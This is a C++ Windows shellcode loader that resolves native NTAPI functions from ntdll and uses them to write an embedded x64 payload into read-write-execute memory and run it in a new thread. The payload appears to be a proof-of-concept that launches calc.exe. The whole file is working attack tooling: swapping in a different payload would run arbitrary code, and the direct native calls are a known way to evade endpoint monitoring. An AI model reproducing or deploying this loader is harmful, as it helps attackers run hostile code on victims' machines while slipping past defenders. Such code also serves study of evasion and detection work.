#include <Windows.h>
#include <cstdio>


// virtualaloc
typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(
	HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG
	);
// WriteProcessMemory 
typedef NTSTATUS
(NTAPI *
NtWriteVirtualMemory)(
	_In_ HANDLE ProcessHandle,
	_In_opt_ PVOID BaseAddress,
	_In_reads_bytes_(NumberOfBytesToWrite) PVOID Buffer,
	_In_ SIZE_T NumberOfBytesToWrite,
	_Out_opt_ PSIZE_T NumberOfBytesWritten
);

//virtualprotect
typedef NTSTATUS(NTAPI* NtProtectVirtualMemory)(
	 HANDLE ,
	PVOID* ,
	PSIZE_T ,
	ULONG ,
	PULONG 
);
//createthread 
typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;
typedef struct _INITIAL_TEB {
    PVOID                StackBase;
	PVOID                StackLimit;
	PVOID                StackCommit;
	PVOID                StackCommitMax;
	PVOID                StackReserved;
} INITIAL_TEB, * PINITIAL_TEB;
typedef struct _UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	_Field_size_bytes_part_opt_(MaximumLength, Length) PWCH Buffer;
} UNICODE_STRING, * PUNICODE_STRING;
typedef const UNICODE_STRING* PCUNICODE_STRING;
typedef struct _OBJECT_ATTRIBUTES
{
	ULONG Length;
	HANDLE RootDirectory;
	PCUNICODE_STRING ObjectName;
	ULONG Attributes;
	PSECURITY_DESCRIPTOR SecurityDescriptor;
	PSECURITY_QUALITY_OF_SERVICE SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef const OBJECT_ATTRIBUTES* PCOBJECT_ATTRIBUTES;
typedef NTSTATUS (NTAPI*
NtCreateThreadEx)(
	_Out_ PHANDLE ThreadHandle,
	_In_ ACCESS_MASK DesiredAccess,
	_In_opt_ PCOBJECT_ATTRIBUTES ObjectAttributes,
	_In_ HANDLE ProcessHandle,
	_In_ PVOID StartRoutine,
	_In_opt_ PVOID Argument,
	_In_ ULONG CreateFlags, // THREAD_CREATE_FLAGS_*
	_In_ SIZE_T ZeroBits,
	_In_ SIZE_T StackSize,
	_In_ SIZE_T MaximumStackSize,
	_In_opt_ PVOID AttributeList
);
//waitforsingle object 
typedef NTSTATUS (NTAPI* NtWaitForSingleObject)(
	HANDLE Handle,
	BOOLEAN Alertable,
	PLARGE_INTEGER Timeout
);

//virtualfree
typedef NTSTATUS (NTAPI*
NtFreeVirtualMemory)(
	HANDLE ProcessHandle,
	__drv_freesMem(Mem) PVOID* BaseAddress,
	PSIZE_T RegionSize,
	ULONG FreeType
);

//closehandle
typedef NTSTATUS (NTAPI* NtClose)(
	 _Post_ptr_invalid_ HANDLE Handle
);


int main() {
	char pay[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		 "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		 "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		 "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		 "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		 "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		 "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		 "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		 "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		 "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		 "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		 "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		 "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		 "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		 "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		 "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
		 "\x6f\x87\xff\xd5\xbb\xcd\x64\x9f\x68\x41\xba\xa6\x95\xbd"
		 "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
		 "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
		 "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
	SIZE_T s = sizeof(pay);
	DWORD old ;
	HANDLE p = (HANDLE)-1;
	HMODULE ntdll = GetModuleHandleA("ntdll");
	if (!ntdll) {                                    
		printf("[!] GetModuleHandleA failed: %lu\n", GetLastError());
		return 1;
	}
	NtAllocateVirtualMemory_t Ntavm = (NtAllocateVirtualMemory_t)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
	LPVOID addr = nullptr;
	NTSTATUS status = Ntavm( p, &addr, 0, &s, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );

	if (status < 0) {
		printf("NtAllocateVirtualMemory failed: 0x%08X\n",
			static_cast<unsigned>(status));
		return 1;
	}



	NtWriteVirtualMemory nwvm = (NtWriteVirtualMemory)GetProcAddress(ntdll, "NtWriteVirtualMemory");
	SIZE_T sl;
	nwvm(p, addr, pay, s, &sl);
	NtProtectVirtualMemory Ntpvm = (NtProtectVirtualMemory)GetProcAddress(ntdll, "NtProtectVirtualMemory");
	Ntpvm( p , &addr , &s, PAGE_EXECUTE_READWRITE,&old);
	
	HANDLE th = NULL;
	PCLIENT_ID ClientId = 0;
	NtCreateThreadEx Ntctex = (NtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
	Ntctex(&th, THREAD_ALL_ACCESS, NULL, p, addr, NULL, FALSE, 0, 0, 0,  NULL);
	if (!Ntctex) { printf("Ntctex error: %lu", GetLastError()); }
	NtWaitForSingleObject nwso = (NtWaitForSingleObject)GetProcAddress(ntdll, "NtWaitForSingleObject");
	//  Build a LARGE_INTEGER timeout (negative = relative, in 100-ns units)
	LARGE_INTEGER timeout;
	timeout.QuadPart = -5000LL * 10000LL;   // 5000 ms → 5,000,000 * 100 ns
	nwso(th, TRUE, &timeout);
	NtClose ntc = (NtClose)GetProcAddress(ntdll, "NtClose");
	ntc(th);
	NtFreeVirtualMemory nfvm = (NtFreeVirtualMemory)GetProcAddress(ntdll, "NtFreeVirtualMemory");
	nfvm(p, &addr, &s, MEM_RELEASE);

	return 0;

}